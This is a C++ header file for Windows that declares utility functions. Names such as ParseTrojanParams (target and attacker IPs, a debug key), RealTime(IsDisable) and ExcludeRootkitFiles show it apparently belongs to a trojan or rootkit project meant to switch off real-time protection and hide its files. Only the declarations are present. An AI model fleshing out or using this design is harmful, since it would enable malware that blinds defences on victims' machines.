#pragma once
#include <iostream>
#include <Windows.h>

typedef struct _RETURN_LAST {
	DWORD LastError;
	LSTATUS Represent;
} RETURN_LAST, * PRETURN_LAST;

typedef struct _REPLACEMENT {
	char* Replace;
	char WhereTo;
	int RepCount;
} REPLACEMENT, * PREPLACEMENT;

RETURN_LAST RealTime(BOOL IsDisable);
int CharpToWcharp(const char* ConvertString, WCHAR* ConvertedString);
int WcharpToCharp(char* ConvertString, const WCHAR* ConvertedString);
void ReplaceValues(const char* BaseString, REPLACEMENT RepArr[], char* Output, int Size);
DWORD ExecuteSystem(const char* BaseCommand, REPLACEMENT RepArr[], int Size);
int ShowMessage(int Type, const char* Title, const char* Text);
int CountOccurrences(const char* SearchStr, char SearchLetter);
int CheckLetterInArr(char Chr, const char* Arr);
BOOL PerformCommand(const char* CommandArr[], const char* Replacements[], const char* Symbols, int CommandCount, int SymbolCount);
void ParseTrojanParams(LPVOID ParamBuffer, char* TargetIp, char* AttackerIp, char* DebugPort, char* DebugKey);
int FileOperation(char* FilePath, HANDLE* FileHandle, PVOID* FileData,
	ULONG64* FileDataSize, BOOL IsWrite, BOOL ShouldNullTerm);
int GetIndexOfSubstringInString(char* MainString, char* SubString);
BOOL IsValidIp(char* Address);
char* ExtractGateways(char* IpConfigOutput);
char* GetGatewayList();
DWORD ExcludeRootkitFiles();